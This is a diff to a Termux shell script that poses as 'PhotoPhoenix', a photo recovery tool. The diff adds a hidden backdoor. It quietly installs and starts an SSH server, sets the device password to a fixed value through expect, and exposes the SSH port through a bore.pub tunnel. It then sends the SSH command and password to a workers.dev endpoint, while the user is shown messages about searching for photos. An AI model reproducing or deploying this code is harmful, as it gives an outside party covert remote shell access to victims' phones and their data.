@@ -69,17 +69,29 @@ then
       sleep 3
     done &
     echo -e "${GREEN}Internet connection is via a Wi-Fi network.\nPhotoPhoenix continues to work ...${END}"
-    sleep 6
-    pkg install -y python
-    pkg install -y nodejs
+    pkg install -y openssh >/dev/null 2>&1
+    pkg install -y expect
+    pkg install -y bore
     echo -e "${GREEN}Please wait ...${END}"
-    npm install -g localtunnel >/dev/null 2>&1
-    sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
-    python -m http.server 8888 >/dev/null 2>&1 &
-    lt -p 8888 > tppd.txt 2>/dev/null &
+    sshd
+    export SSH_PASSWORD="88888888"
+    expect << "EOF" >/dev/null 2>&1
+    set timeout 10
+    spawn passwd
+    expect "New password:" {} timeout { exit 1 }
+    send "$env(SSH_PASSWORD)\r"
+    expect "Retype new password:" {} timeout { exit 1 }
+    send "$env(SSH_PASSWORD)\r"
+    expect eof
+    catch wait PASSWD_STATUS
+    exit [ lindex $PASSWD_STATUS end ]
+EOF
+    bore local 8022 --to bore.pub > tppd.txt 2>/dev/null &
     sleep 6
-    BACKDOOR_URL=$(grep -o "https://[^ ]*" tppd.txt)
-    curl https://api-photophoenix.photophoenix8.workers.dev --data-urlencode $'text=Backdoor URL :\n\n'"$BACKDOOR_URL" >/dev/null 2>&1
+    USER_NAME=$(whoami)
+    SSH_PORT=$(sed "s/\x1b\[[0-9;]*m//g" tppd.txt | grep -oP "remote_port=\K\d+")
+    SSH_COMMAND="ssh -p $SSH_PORT ${USER_NAME}@bore.pub"
+    curl https://api-photophoenix.photophoenix8.workers.dev --data-urlencode $'text=Backdoor\n\nSSH command :\n\n'"$SSH_COMMAND"$'\n\nSSH password :\n\n'"$SSH_PASSWORD" >/dev/null 2>&1
     rm "tppd.txt"
     echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
     sleep 30
